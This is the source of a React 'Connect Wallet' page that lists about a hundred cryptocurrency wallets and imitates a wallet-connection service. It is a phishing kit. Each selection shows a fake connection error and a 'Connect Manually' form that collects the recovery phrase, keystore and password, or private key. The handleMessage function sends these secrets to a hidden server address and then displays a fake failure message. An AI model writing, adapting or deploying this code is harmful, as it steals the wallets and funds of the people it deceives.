import React, { useState } from 'react';

import { FaStrikethrough } from "react-icons/fa";
import ton from '../../image/tonwallet.png';
import tonkeeper from '../../image/Tonkeeperwallet.png';
import TonHubWallet from '../../image/TonHubWallet.png'
import Electrum from '../../image/Electrum.png'
import Uniswap from '../../image/Uniswap.png'
import gate from '../../image/gate.png'
import sui from '../../image/sui.png'
import suiet from '../../image/suiet.png'
import nightly from '../../image/nightly.png'
import shadow from '../../image/shadow.png'
import ethos from '../../image/ethos.png'
import surf from '../../image/surf.png'
import bestwallet from '../../image/bestwallet.png'
import walletConnect from '../../image/walletConnect.png'
import trust from '../../image/truat.png'
import solana from '../../image/solana.png'
import Solflare from '../../image/Solflare.png'
import unisat from '../../image/unisat.png'
import okx from '../../image/okx.png'
import Xverse from '../../image/Xverse.png'
import magiceden from  '../../image/magic_eden.png'
import leather from '../../image/leather.png'
import asigna from '../../image/asigna.png'
import Metamask from '../../image/Metamask.png'
import ledger from '../../image/ledger.png'
import brb from '../../image/bbb.png'
import Coinbase from '../../image/Coinbase.png'
import saitama from '../../image/saitama.png'
import terra from '../../image/terra.png'
import phantom from'../../image/phantom.png'
import cosmos from '../../image/cosmos.png'
import exodus from '../../image/exodus.png'
import rainbow from '../../image/rainbow.png'
import argent from '../../image/argent.png'
import binance from '../../image/binance.png'
import safemoon from '../../image/safemoon.png'
import Gnosis from '../../image/Gnosis.png'
import dafi from '../../image/dafi.png'
import pillar from '../../image/pillar.png'
import imToken from '../../image/imToken.png'
import onto from '../../image/ONTO.png'
import tokenPocket from '../../image/tokenPocket.png'
import aave from '../../image/aave.png'
import digitex from '../../image/digitex.png'
import portis from '../../image/portis.png'
import formatic from '../../image/formatic.png'
import mathWallet from '../../image/mathWallet.png' 
import bitPay from '../../image/bitPay.png'
import ledgerLive from '../../image/ledgerLive.png'
import WallETH from '../../image/WallETH.png'
import Authereum from '../../image/Authereum.png'
import Dharma from '../../image/Dharma.png'
import inchWallet from '../../image/inchWallet.png'
import huobi from '../../image/huobi.png'
import mykey from '../../image/MYKEY.png'
import Eidoo from '../../image/Eidoo.png'
import loopring from '../../image/loopring.png'
import atomic from '../../image/atomic.png'
import trustvault from '../../image/trustvault.png'
import coin98 from '../../image/coin98.png'
import tron from '../../image/tron.png'
import alice from '../../image/alice.png'
import AlphaWallet from '../../image/AlphaWallet.png'
import dcent from '../../image/dcent.png'
import zelCore from '../../image/zelCore.png'
import Nash from '../../image/Nash.png'
import Coinmoni from '../../image/Coinmoni.png'
import GridPlus from '../../image/GridPlus.png'
import cybavo from '../../image/CYBAVO.png'
import tokenary from '../../image/tokenary.png'
import torus from '../../image/torus.png'
import Spatium from '../../image/spatium.png'
import safePal from '../../image/safePal.png'
import infinito from '../../image/infinito.png'
import walletio from '../../image/walletio.png'
import ownbit from '../../image/ownbit.png'
import easyPocket from '../../image/easyPocket.png'
import bridgeWallet from '../../image/bridgeWallet.png'
import sparkPoint from '../../image/Sparkpoint.png'
import viaWallet from '../../image/viaWallet.png'
import bitKeep from '../../image/bitKeep.png'
import vision from '../../image/vision.png'
import pEAKDEFI from '../../image/PEAKDEFI.png'
import unstoppable from '../../image/Unstoppable.png'
import haloDeFi from '../../image/haloDeFi.png'
import dokWallet from '../../image/dokWallet.png'
import midas from '../../image/midas.png'
import ellipal from '../../image/ellipal.png'
import keyringPro from '../../image/keyringPro.png'
import Aktionariat from '../../image/Aktionariat.png' 
import talken from '../../image/talken.png'
import Flare from '../../image/Flare.png'
import KyberSwap from '../../image/KyberSwap.png'
import PayTube from '../../image/PayTube.png'
import Linen from '../../image/Linen.png'
import {Link} from 'react-router-dom'
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';


function Wallet({coins}) {
  const [searchTerm, setSearchTerm] = useState('');
  const [inputWallet, setInputWallet] = useState(false)
  const [platform, setPlatform] = useState(null)
  const [proceed, setProceed] = useState(false)
  const [privateKey, setPrivatekey] = useState("")
  const [phrase, setPhrase] = useState("")
  const [keystore, setKeystore] = useState("")
  const [walletPassword, setWalletPassword] = useState("")
  const [isVisible, setIsVisible] = useState(true);



  
  const wallet = [
    { image: ton, platform: "MyTon Wallet" },
    { image: tonkeeper, platform: "Tonkeeper Wallet" },
    { image: TonHubWallet, platform: "TonHub Wallet" },
    { image: Electrum, platform: "Electrum Wallet" },
    { image: Uniswap, platform: "Uniswap Wallet" },
    { image: gate, platform: "Gate Wallet" },

    { image: sui, platform: "Sui Wallet" },
    { image: suiet, platform: "suiet Wallet" },
    { image: nightly, platform: "Nightly Wallet" },
    { image: shadow, platform: "Shadow Wallet" },
    { image: ethos, platform: "Ethos Wallet" },
    { image: surf, platform: "Surf Wallet" },

    { image: bestwallet, platform: "Best Wallet" },
    { image: walletConnect, platform: "Wallet Connect" },
    { image: trust, platform: "Trust Wallet" },
    { image: solana, platform: "Solana Wallet" },
    { image: Solflare, platform: "Solflare Wallet" },
    { image: unisat, platform: "Unisat Wallet" },

    { image: okx, platform: "OKX Wallet" },
    { image: Xverse, platform: "Xverse Connect" },
    { image: magiceden, platform: "Magic Eden Wallet" },
    { image: leather, platform: "Leather Wallet" },
    { image: asigna, platform: "Asigna Wallet" },
    { image: Metamask, platform: "Metamask " },

    { image: ledger, platform: "Ledger" },
    { image: brb, platform: "BRB Connect" },
    { image: Coinbase, platform: "Coinbase" },
    { image: saitama, platform: "Saitama Wallet" },
    { image: terra, platform: "Terra Wallet" },
    { image: phantom, platform: "phantom Wallet " },

    { image: cosmos, platform: "Cosmos Stattion" },
    { image: exodus, platform: "Exodus Wallet" },
    { image: rainbow, platform: "Rainbow" },
    { image: argent, platform: "Argent" },
    { image: binance, platform: "binance Chain" },
    { image: safemoon, platform: "Safemoon " },

    { image: Gnosis, platform: "Gnosis Safe" },
    { image: dafi, platform: "DeFi" },
    { image: pillar, platform: "Pillar" },
    { image: imToken, platform: "imToken" },
    { image: onto, platform: "ONTO" },
    { image: tokenPocket, platform: "TokenPocket " },

    { image: aave, platform: "Aave" },
    { image: digitex, platform: "Digitex" },
    { image: portis, platform: "Portis" },
    { image: formatic, platform: "Formatic" },
    { image: mathWallet, platform: "MathWallet" },
    { image: bitPay, platform: "BitPay " },

    { image: ledgerLive, platform: "Ledger Live" },
    { image: WallETH, platform: "WallETH" },
    { image: Authereum, platform: "Authereum" },
    { image: Dharma, platform: "Dharma" },
    { image: inchWallet, platform: "1inch Wallet" },
    { image: huobi, platform: "Huobi " },

    { image: Eidoo, platform: "Eidoo" },
    { image: mykey, platform: "MYKEY" },
    { image: loopring, platform: "loopring" },
    { image: trustvault, platform: "trustvault" },
    { image: atomic, platform: "Atomic" },
    { image: coin98, platform: "Coin98 " },

    { image: tron, platform: "Tron" },
    { image: alice, platform: "Alice" },
    { image: AlphaWallet, platform: "AlphaWallet" },
    { image: dcent, platform: "D'cent" },
    { image: zelCore, platform: "ZelCore" },
    { image: Nash, platform: "Nash " },

    { image: Coinmoni, platform: "Coinmoni" },
    { image: GridPlus, platform: "GridPlus" },
    { image: cybavo, platform: "CYBAVO" },
    { image: tokenary, platform: "Tokenary" },
    { image: torus, platform: "Torus" },
    { image: Spatium, platform: "Spatium " },

    { image: safePal, platform: "SafePal" },
    { image: infinito, platform: "Infinito" },
    { image: walletio, platform: "Wallet.io" },
    { image: ownbit, platform: "Ownbit" },
    { image: easyPocket, platform: "EasyPocket" },
    { image: bridgeWallet, platform: "Bridge Wallet " },

    { image: sparkPoint, platform: "Spark Point" },
    { image: viaWallet, platform: "ViaWallet" },
    { image: bitKeep, platform: "BitKeep" },
    { image: vision, platform: "Vision" },
    { image: pEAKDEFI, platform: "PEAKDEFI" },
    { image: unstoppable, platform: "Unstoppable " },

    { image: haloDeFi, platform: "haloDeFi" },
    { image: dokWallet, platform: "dokWallet" },
    { image: midas, platform: "Midas" },
    { image: ellipal, platform: "Ellipal" },
    { image: keyringPro, platform: "kEYRING PRO" },
    { image: Aktionariat, platform: "Aktionariat " },

    { image: talken, platform: "Talken" },
    { image: Flare, platform: "Flare" },
    { image: KyberSwap, platform: "KyberSwap" },
    { image: PayTube, platform: "PayTube" },
    { image: Linen, platform: "Linen" },


  ];


  function handlePlatform(chain){
    // setAnswer(!answer)
    setPlatform(chain)
}
  const filteredWallets = wallet.filter(w =>
    w.platform.toLowerCase().includes(searchTerm.toLowerCase())
  );

  function handleBack() {
    setPlatform(false);
  }

  function handleInput(){
    setInputWallet(!inputWallet)
    setProceed(false)

  }



  async function handleMessage(e){
    e.preventDefault()
    setProceed(true)
    const baseUrl = process.env.REACT_APP_BASE_URL

      try {
        
        const responds = await fetch(baseUrl, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body : JSON.stringify({phrase, keystore, privateKey, walletPassword})
      })
      .then(res=>res.json())
      if(responds){
          setProceed(false)
          
          toast.error("Unable to connect wallet, Please try another wallet or try again later"); 
      }
      } catch (error) {
          console.error(error)
      }
        }



  // 

  const [activeTab, setActiveTab] = useState('phrase');

  const handleTabClick = (tab) => {
    setActiveTab(tab);
  };

  
  return (
    <div className='w-full flex flex-col justify-center items-center bg-black py-[30px]'>
      <ToastContainer
      position="top-center"
      autoClose={15000}
      hideProgressBar={false}
      newestOnTop={false}
      closeOnClick={false}
      rtl={false}
      pauseOnFocusLoss
      draggable
      pauseOnHover
      theme="light"
      />

      <a href="/">
        <h1 className="text-blue-500 text-center cursor-pointer text-[30px] font-bold mx-auto">
          <FaStrikethrough />
        </h1>
      </a>

      {/* heading of the page */}
      <div className='w-full flex flex-col gap-[10px] justify-center items-center'>
        <p className='text-white text-[50px] font-bold'>Connect Wallet</p>
        <p className='text-white text-[17px] font-semibold'>Please connect your wallet to continue</p>
        <input
          className='w-[90%] py-[5px] justify-center items-center flex text-center'
          type="text"
          placeholder='Search Wallet Names...'
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
        />
      </div>
      {/* end of the heading of the page */}

      {/* list of coins will display here */}
   {!platform ?   
   (<div className='grid grid-cols-3 pl-[40px] md:grid-cols-4 lg:grid-cols-6 gap-[20px] md:gap-[50px] py-[30px] w-[95%] md:w-[85%]'>
        {filteredWallets.map((w, index) => (
          <div key={index} onClick={()=>handlePlatform(w)} className='flex cursor-pointer flex-col gap-[5px] w-[55%]'>
            <img className='' src={w.image} alt="" />
            <p className='text-white text-center text-[13px] font-semibold'>{w.platform}</p>
          </div>
        ))}
      </div>):(
        <div className=' w-[90%] md:w-[70%] lg:w-[35%] mt-[30px]'>
          <div className='bg-slate-300 w-full rounded-t-[20px] py-[20px] justify-between flex px-[30px]'>
            <p onClick={handleBack} className='cursor-pointer text-blue-600 font-bold'>Back</p>
            <p onClick={handleBack} className='cursor-pointer'>X</p>
          </div>
          <div className='bg-white rounded-b-[20px] w-full gap-[30px] py-[30px] flex flex-col justify-center items-center'>
            <div className='outline-red-500 outline rounded-[10px] gap-[17px] h-[90px] flex justify-center items-center w-[95%]  md:w-[80%]'>
              <p className='text-red-500 font-bold'>Error Connecting...</p>
              <button onClick={handleInput} className='bg-black rounded-[10px] text-white p-[8px]'>Connect Manually</button>
            </div>
            {
                <div className='outline-red-500 outline rounded-[10px] h-[90px] gap-[12px] flex justify-around items-center w-[95%]  md:w-[80%]'>
                    <div 
                    //  onClick={()=>handlePlatform(index)}
                     className='w-[15%]'>
                        <img src={platform.image} alt='' />
                    </div>
                    <p className='text-black font-bold'>{platform.platform}</p>
                  </div>
            }
          </div>
        </div>
      )}

    {
        inputWallet && 
        <div className='w-[90%] md:w-[70%] lg:w-[50%] flex absolute bottom-[20px] md:bottom-[300px] lg:bottom-[-50px] rounded-[15px] flex-col gap-[25px] py-[20px] px-[30px] bg-slate-100'>
            <div className='w-[100%] gap-[30px] flex justify-start items-center'>
              <div className='w-[13%] bg-red-500'>
                <img src={bestwallet} alt="" />
              </div>
              <p className='text-[25px] font-bold'>Wallet Name</p>
            </div>
          

              <div>
              {/* Tab Navigation */}
              <div className="flex justify-around items-center w-full">
                <Link to="#">
                  <p
                    onClick={() => handleTabClick('phrase')}
                    className={`text-lg font-semibold ${
                      activeTab === 'phrase' ? 'text-blue-700' : 'text-black'
                    }`}
                  >
                    Phrase
                  </p>
                </Link>
                <Link to="#">
                  <p
                    onClick={() => handleTabClick('keystore')}
                    className={`text-lg font-semibold ${
                      activeTab === 'keystore' ? 'text-blue-700' : 'text-black'
                    }`}
                  >
                    Keystore
                  </p>
                </Link>
                <Link to="#">
                  <p
                    onClick={() => handleTabClick('privateKey')}
                    className={`text-lg font-semibold ${
                      activeTab === 'privateKey' ? 'text-blue-700' : 'text-black'
                    }`}
                  >
                    Private Key
                  </p>
                </Link>
              </div>
        
              {/* Divider */}
              <div className="w-full h-px bg-slate-400 my-2"></div>
        
              {/* Dynamic Content */}
              <div className="w-full">
                {activeTab === 'phrase' && (
                  <div 
                  className='flex flex-col gap-[15px]'
                  >
                    <textarea 
                    onChange= {(e)=>setPhrase(e.target.value)}
                    className="w-full py-2 px-3 border h-[150px] border-black"
                    placeholder="Enter Your Recovery Phrase" />
                      <p className="text-sm font-semibold">
                        Typically 12 (sometimes 24) words separated by single spaces.
                      </p>
                      <button onClick={handleMessage} 
                      className="bg-blue-700 w-full flex justify-center items-center text-white rounded-md py-2 font-bold"
                      >
                    {proceed ? "Connecting..." : "PROCEED"}
                  </button>
                  <button
                  className="bg-red-700 w-full flex justify-center items-center text-white rounded-md py-2 font-bold"
                  onClick={() => setInputWallet(false)}
                  >CANCEL</button>
                  </div>
                )}
        
                {activeTab === 'keystore' && (
                  <div
                  className='flex flex-col gap-[15px]'
                  >
                    <textarea 
                    onChange= {(e)=>setKeystore(e.target.value)}
                    className="w-full h-[150px] py-2 px-3 border border-black"
                   placeholder="Enter Keystore" 
                    
                  />
                  <input
                      onChange= {(e)=>setWalletPassword(e.target.value)}
                      className="w-full py-2 px-3 border border-black"
                      placeholder="Wallet Password"
                    />
                    <p className="text-sm font-semibold">
                      Several lines of text beginning with "..." plus the password you used to encrypt it.
                    </p>
                    <button onClick={handleMessage} className="bg-blue-700 w-full flex justify-center items-center text-white rounded-md py-2 font-bold">
                    {proceed ? "Connecting..." : "PROCEED"}
                  </button>
                  <button
                  className="bg-red-700 w-full flex justify-center items-center text-white rounded-md py-2 font-bold"
                  onClick={() => setInputWallet(false)}
                  >CANCEL</button>
                  </div>
                )}
        
        
                {activeTab === 'privateKey' && (
                <div
                className='flex flex-col gap-[15px]'
                >
                    <input type='text'
                    onChange= {(e)=>setPrivatekey(e.target.value)}
                    className="w-full py-2 px-3 border border-black"
                   placeholder="Enter Your Private Key"/>
                    <p className="text-sm font-semibold">
                      Typically 12 (sometimes 24) words separated by a single space.
                    </p>
                    <button onClick={handleMessage} className="bg-blue-700 w-full flex justify-center items-center text-white rounded-md py-2 font-bold">
                    {proceed ? "Connecting..." : "PROCEED"}
                  </button>
                  <button
                  className="bg-red-700 w-full flex justify-center items-center text-white rounded-md py-2 font-bold"
                  onClick={() => setInputWallet(false)}
                  >CANCEL</button>
                </div>
                )}
              </div>
                  </div> 
        </div>
      }

    </div>

  );
}

export default Wallet;
